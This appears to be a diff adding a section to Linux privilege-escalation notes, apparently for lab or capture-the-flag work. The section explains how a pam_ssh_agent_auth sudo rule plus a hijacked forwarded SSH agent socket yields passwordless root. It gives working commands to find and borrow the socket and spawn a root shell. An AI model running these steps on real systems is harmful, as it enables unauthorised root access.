@@ -1838,3 +1838,27 @@ what you had before — a UID change with an unchanged, already-privileged group
 path to [[linux-container-escape]] without needing the SUID to also flip your GID.
 
 <!-- promoted-slug: suid-setuid-keeps-groups-sg-docker -->
+
+## `pam_ssh_agent_auth`: a hijacked agent socket == passwordless sudo
+
+If `/etc/pam.d/sudo` (or `/etc/pam.d/su`) contains:
+`auth sufficient pam_ssh_agent_auth.so file=/etc/ssh/sudo_authorized_keys`
+then sudo authenticates by checking the caller's SSH **agent** for a key whose pubkey is in that
+(root-owned, 600) file — **no password**. So a hijacked `SSH_AUTH_SOCK` (see *SSH agent hijacking*
+above) that holds the trusted key becomes a root credential:
+```bash
+grep pam_ssh_agent_auth /etc/pam.d/sudo   # the tell
+export SSH_AUTH_SOCK="$(find /tmp -type s -path '/tmp/ssh-*/agent.*' -user "$(whoami)" 2>/dev/null)"
+ssh-add -l && sudo -s      # -> root, no password
+```
+The exploitable socket is left behind when a privileged loop forwards its agent INTO your account —
+e.g. root running `ssh -A -i /root/.ssh/id_rsa you@localhost -tt 'sudo x; sleep infinity'`: the `-A`
+drops a **you-owned** `/tmp/ssh-*/agent.*` and `sleep infinity` keeps it alive. You can't read
+`sudo_authorized_keys` or the root key — you borrow the live forwarded agent. Confirm the loop is
+live with `ps faux | grep -E 'sleep infinity|ssh -A'`.
+
+**Checklist tell:** when a user is in `sudo`/`wheel` but the password is nowhere findable and standard
+vectors dead-end, READ `/etc/pam.d/{sudo,su}` and `/etc/sudoers.d/*` EARLY — a `pam_ssh_agent_auth`,
+`pam_exec`, or bare `NOPASSWD` line IS the vector. (linpeas prints the pam config; read it, don't grep.)
+
+<!-- promoted-slug: pam-ssh-agent-auth-sudo -->
